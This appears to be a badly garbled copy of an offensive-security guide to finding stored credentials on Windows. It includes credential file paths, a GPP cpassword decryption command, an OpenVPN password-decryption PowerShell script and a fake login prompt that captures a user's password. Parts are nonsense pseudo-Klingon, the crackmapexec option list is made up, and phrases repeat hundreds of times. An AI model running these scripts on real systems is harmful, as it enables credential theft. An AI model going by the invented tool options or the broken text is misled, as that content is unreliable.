Cloud credentials are authentication tokens or keys that are used to access and manage cloud resources. These credentials are typically provided by cloud service providers and are used to authenticate users and applications when interacting with cloud services.

Cloud credentials can include:

- **Access keys**: These are pairs of access key IDs and secret access keys that are used to authenticate API requests made to cloud services. They are often used by developers and applications to programmatically access cloud resources.

- **IAM roles**: IAM (Identity and Access Management) roles are a way to grant permissions to entities within a cloud environment. IAM roles can be assigned to users, groups, or services, and they define what actions can be performed on specific resources.

- **Service account keys**: Service accounts are used to authenticate applications and services within a cloud environment. Service account keys are similar to access keys and are used to authenticate API requests.

- **SSH keys**: SSH (Secure Shell) keys are used for secure remote access to cloud instances. SSH keys consist of a public key and a private key, and they are used to authenticate users when connecting to cloud instances via SSH.

It is important to properly manage and secure cloud credentials to prevent unauthorized access and potential security breaches. This includes regularly rotating access keys, using strong and unique passwords, and implementing multi-factor authentication where possible.
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

QaStaHvIS **SiteList.xml** file

### Cached GPP Password

QaStaHvIS, Group Policy Preferences (GPP) Daq yIlo'laHbe'chugh, jatlhpu' mach jatlhpu' ghomDaq lo'laHbe'chugh local administrator accounts deployment. 'ach, vaj GPPs, XML files stored SYSVOL, 'oH QaQmey user 'e' vItlhutlh. QaStaHvIS, 'oH QaQmey GPPs, AES256 encryption vItlhutlh, publicly documented default key, 'oH QaQmey authenticated user 'e' vItlhutlh. vaj, 'oH QaQmey vItlhutlh, elevated privileges ghaH vItlhutlh users 'e' vItlhutlh.

QaStaHvIS, 'oH QaQmey function, locally cached GPP files vItlhutlh "cpassword" field vItlhutlh not empty. QaStaHvIS, 'oH QaQmey function, password vItlhutlh decrypt vItlhutlh, custom PowerShell object vItlhutlh return vItlhutlh. 'oH QaQmey object, GPP 'ej file's location vItlhutlh, 'oH QaQmey security vulnerability identification 'ej remediation vItlhutlh.

QaStaHvIS, 'oH QaQmey files vItlhutlh Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**cPassword vItlhutlh decrypt vItlhutlh:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Using crackmapexec to get the passwords:

crackmapexec-ghIjmoqrsuvxz [-h] [-t THREADS] [-u USERNAME] [-p PASSWORD] [-H HASH] [-P PASSWORDS] [-C CREDS] [-M MODULES] [-o OUTPUT] [-d] [-v] [-q] [-s] [-r] [-R] [-S] [-f] [-c] [-n] [-e] [-g] [-m] [-l] [-T TIMEOUT] [-U] [-D] [-G] [-a] [-b] [-k] [-O] [-I] [-A] [-B] [-E] [-F] [-x] [-y] [-z] target

crackmapexec-ghIjmoqrsuvxz is a powerful tool that can be used to perform password cracking attacks. It supports various options and parameters to customize the attack. Here are some of the most commonly used options:

- -h: Displays the help message and usage information.
- -t THREADS: Specifies the number of threads to use for the attack.
- -u USERNAME: Specifies a single username to use for the attack.
- -p PASSWORD: Specifies a single password to use for the attack.
- -H HASH: Specifies a single hash to use for the attack.
- -P PASSWORDS: Specifies a file containing a list of passwords to use for the attack.
- -C CREDS: Specifies a file containing a list of credentials (username:password) to use for the attack.
- -M MODULES: Specifies a comma-separated list of modules to use for the attack.
- -o OUTPUT: Specifies the output file to save the results of the attack.
- -d: Enables debug mode, which provides additional information during the attack.
- -v: Enables verbose mode, which displays detailed information during the attack.
- -q: Enables quiet mode, which suppresses unnecessary output during the attack.
- -s: Enables safe mode, which limits the attack to safe operations only.
- -r: Enables recursive mode, which performs the attack on all subdirectories.
- -R: Enables random mode, which randomizes the order of targets during the attack.
- -S: Enables smart mode, which optimizes the attack by skipping unnecessary steps.
- -f: Enables force mode, which forces the attack even if it may be risky.
- -c: Enables continue mode, which resumes a previously interrupted attack.
- -n: Enables null mode, which performs the attack without actually changing anything.
- -e: Enables execute mode, which executes a command on the target after successful authentication.
- -g: Enables group mode, which performs the attack on a group of targets.
- -m: Enables machine mode, which performs the attack on a machine.
- -l: Enables local mode, which performs the attack on the local machine.
- -T TIMEOUT: Specifies the timeout value for network operations during the attack.
- -U: Enables uppercase mode, which includes uppercase characters in the attack.
- -D: Enables digits mode, which includes digits in the attack.
- -G: Enables special mode, which includes special characters in the attack.
- -a: Enables all mode, which includes all possible characters in the attack.
- -b: Enables bruteforce mode, which performs a bruteforce attack.
- -k: Enables keyboard mode, which prompts for credentials during the attack.
- -O: Enables offline mode, which performs an offline attack using previously captured credentials.
- -I: Enables interactive mode, which allows interactive input during the attack.
- -A: Enables automatic mode, which automatically selects the best attack method.
- -B: Enables benchmark mode, which measures the performance of the attack.
- -E: Enables experimental mode, which enables experimental features.
- -F: Enables fast mode, which performs the attack as fast as possible.
- -x: Enables extra mode, which enables extra features.
- -y: Enables yes mode, which automatically answers yes to all prompts.
- -z: Enables zero mode, which performs the attack with zero risk.

target: Specifies the target(s) to attack. This can be an IP address, hostname, or a file containing a list of targets.

Note: The options and parameters mentioned above are just a subset of the available options in crackmapexec-ghIjmoqrsuvxz. For more information, refer to the tool's documentation.
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config

#### Description

The IIS Web Config is a configuration file used by the Internet Information Services (IIS) web server to define various settings for a website. It is an XML file that contains directives and parameters that control the behavior of the web server and the applications hosted on it.

#### Location

The IIS Web Config file is typically located in the root directory of the website, with the filename `web.config`. It can also be found in subdirectories of the website, where each subdirectory can have its own `web.config` file to override or add additional settings.

#### Common Settings

The IIS Web Config file can contain a wide range of settings, but some of the most common ones include:

- **Authentication**: Configuring how users are authenticated, such as using Windows authentication, forms-based authentication, or anonymous access.
- **Authorization**: Specifying which users or groups have access to specific resources or directories.
- **URL Rewriting**: Defining rules to rewrite or redirect URLs for SEO purposes or to handle specific routing scenarios.
- **Custom Error Pages**: Configuring custom error pages to be displayed when certain HTTP errors occur.
- **Compression**: Enabling compression to reduce the size of transmitted data and improve website performance.
- **Caching**: Configuring caching settings to improve the speed and efficiency of serving static content.
- **HTTP Headers**: Adding or modifying HTTP headers to control various aspects of the HTTP response.
- **Request Filtering**: Defining rules to filter or block certain types of requests based on criteria such as file extensions or request methods.

#### Modifying the Web Config

To modify the IIS Web Config file, you can use a text editor or an IIS management tool such as the Internet Information Services (IIS) Manager. Changes made to the file will take effect immediately, without requiring a restart of the web server.

#### Security Considerations

Since the IIS Web Config file contains sensitive configuration information, it is important to ensure that proper security measures are in place to protect it. Some best practices include:

- **Access Control**: Restricting access to the file to only authorized users or administrators.
- **Encryption**: Encrypting the contents of the file to prevent unauthorized access or tampering.
- **Regular Auditing**: Monitoring and reviewing changes made to the file to detect any unauthorized modifications.
- **Backup and Recovery**: Regularly backing up the file to ensure that it can be restored in case of accidental deletion or corruption.

#### References

- [Microsoft Docs: Web.config File](https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/bz9tc508(v=vs.100))
- [IIS.net: Configuration Reference](https://www.iis.net/configreference)
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Example of web.config with credentials:

```
<configuration>
  <appSettings>
    <add key="DatabaseUsername" value="admin" />
    <add key="DatabasePassword" value="P@ssw0rd123" />
  </appSettings>
</configuration>
```

This is a typical configuration file for a web application that stores sensitive credentials, such as database usernames and passwords. It is important to secure this file properly to prevent unauthorized access to these credentials.
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials

#### English Translation:

### OpenVPN credentials

#### Klingon Translation:

### OpenVPN jatlh
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs

#### Event Logs

Event logs are a valuable source of information for identifying security incidents and troubleshooting system issues. Windows provides several types of event logs, including:

- **Application Log**: Records events related to applications and programs.
- **Security Log**: Records security-related events, such as logon attempts, privilege use, and system access.
- **System Log**: Records events related to the operating system and system components.
- **Setup Log**: Records events related to the installation of software and hardware.
- **Forwarded Events**: Contains events collected from remote computers.

To view the event logs on a Windows system, you can use the Event Viewer tool. This tool allows you to filter and search for specific events, as well as export logs for further analysis.

#### Logon Logs

Logon logs provide information about user logon activity on a Windows system. They can be useful for detecting unauthorized access attempts and identifying potential security breaches. Windows logs various logon events, including:

- **Successful Logons**: Records successful user logons.
- **Failed Logons**: Records failed user logon attempts.
- **Logoff Events**: Records user logoff events.

To view logon logs on a Windows system, you can use the Event Viewer tool or query the Security event log using PowerShell commands.

#### Audit Logs

Audit logs are a critical component of a robust security monitoring strategy. They provide a detailed record of system activity, allowing you to track changes, detect anomalies, and investigate security incidents. Windows offers several auditing features, including:

- **Object Access Auditing**: Tracks access to files, folders, and other system objects.
- **Account Management Auditing**: Monitors changes to user accounts, such as password resets and group membership modifications.
- **Privilege Use Auditing**: Logs events related to the use of user privileges, such as the assignment of administrative rights.
- **Policy Change Auditing**: Records changes to security policies and configurations.

To enable auditing on a Windows system, you can use the Group Policy Editor or modify the local security policy settings. The audit logs can be viewed using the Event Viewer tool or queried using PowerShell commands.

#### Firewall Logs

Firewall logs provide information about network traffic and can help identify potential security threats. Windows Firewall logs events related to inbound and outbound connections, including:

- **Allowed Connections**: Records successful connections that were allowed by the firewall.
- **Blocked Connections**: Records connection attempts that were blocked by the firewall.
- **Dropped Connections**: Records connections that were dropped by the firewall due to policy rules.

To view firewall logs on a Windows system, you can use the Windows Firewall with Advanced Security console or query the Windows Firewall log files directly.

#### Sysmon Logs

Sysmon (System Monitor) is a powerful tool that provides detailed information about system activity, including process creation, network connections, and file creation. Sysmon logs can be invaluable for detecting advanced threats and investigating security incidents. To enable Sysmon logging on a Windows system, you can download and install the Sysmon tool from the Microsoft website. The logs can be viewed using the Event Viewer tool or queried using PowerShell commands.

#### Conclusion

Logs play a crucial role in maintaining the security of a Windows system. By regularly reviewing and analyzing logs, you can detect and respond to security incidents in a timely manner. It is important to configure appropriate logging settings and implement a centralized log management solution to effectively monitor and analyze logs from multiple systems.
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### qaw'wI' neH

**qaw'wI'** **user credentials** **yInIDmey** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej** **user credentials** **'ej
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Possible filenames containing credentials**

**passwords** in **clear-text** or **Base64** may be found in the following known files:
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

